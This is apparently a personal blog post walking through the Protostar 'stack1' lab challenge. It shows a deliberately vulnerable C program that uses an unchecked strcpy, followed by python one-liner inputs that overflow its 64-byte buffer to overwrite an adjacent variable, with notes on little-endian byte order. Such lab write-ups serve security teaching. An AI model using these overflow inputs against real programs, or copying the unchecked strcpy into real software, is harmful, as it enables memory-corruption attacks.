---
layout: post
title: "More Stack Overflows: protostar stack1"
date: 2018-09-09 12:35:12 -700
categories: jekyll update
---
The next stack based overflow challenge on protostar involves setting a variable equal to a specific value.

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
} 
{% endhighlight %}

As we can see, the goal of this level is to set the 'modified' variable equal to the value 0x61626364, and it should output a message that we have completed the challenge. 

Note that the input you supply is actually through the command line. It would be supplied like this, where foobar is whatever your input is.

$./stack1 foobar

Let's solve this.

$./stack1 $(python -c 'print "A"*65')

Try again, you got 0x00000041

$

We know the buffer is size 64, and if we look at the source code, we see that the variable we are attempting to modify is right next to the buffer. It makes perfect sense that putting one character more than the size of the buffer would set the variable equal to 0x41, which is the ascii value of "A".

what does this mean?
It means we need to fill the buffer with 64 characters (I will be using "A", but you could do it with really any) and then we need to set the variable equal to 0x61626364. That should be easy!

For the variable, we could either use python (or another language like perl) to set the variable, or we could use ascii characters, if they are printable. Because this is a rare case of needing to set a variable to a number with corresponding ascii characters in the printable range, let's do this.
We can look up the ascii table and find that 
	0x61 corresponds to "a"
	0x62 corresponds to "b"
	0x63 corresponds to "c"
	0x64 corresponds to "d"

$./stack1 $(python -c 'print "A"*64 + "abcd"')

Try again, you got 0x64636261

$

Our number looks backwards! What is going on here? If you notice, the first character we put into it was "a", which is 0x61. But we see that is at the end of our number, when we need it at the beginning. 

This is because of something called Little Endian byte order, which essentially means that the first byte we put in will be the least significant byte.

This also means, in terms of solving this challenge, we need to put our ascii characters backwards. 

$./stack1 $(python -c 'print "A"*64 + "dcba"')

you have correctly got the variable to the right value

$

Cool, now we know that we can set variables to be equal to specific values!